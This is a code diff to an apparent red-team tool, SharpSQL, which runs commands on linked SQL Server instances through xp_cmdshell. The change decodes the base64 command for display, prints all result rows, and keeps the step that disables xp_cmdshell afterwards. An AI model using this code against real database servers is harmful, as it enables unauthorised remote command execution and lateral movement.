@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Data.SqlClient;
+using System.Text;
 
 
 namespace SharpSQL.Commands
@@ -124,11 +125,15 @@ namespace SharpSQL.Commands
             command = new SqlCommand(execCmd, connection);
             reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine($"[*] Executing command on {target}..");
-            Console.WriteLine("[+] Command result: " + reader[0]);
-            reader.Close();
+			Console.WriteLine($"[*] Executing '{Encoding.Unicode.GetString(Convert.FromBase64String(cmd))}' command on '{target}'..\r\n");
 
-            string disableXP = $"EXEC ('sp_configure ''xp_cmdshell'', 0; RECONFIGURE;') AT [{target}]";
+			while (reader.Read())
+			{
+				Console.WriteLine(reader[0]);
+			};
+			reader.Close();
+
+			string disableXP = $"EXEC ('sp_configure ''xp_cmdshell'', 0; RECONFIGURE;') AT [{target}]";
             command = new SqlCommand(disableXP, connection);
             reader = command.ExecuteReader();
             reader.Read();
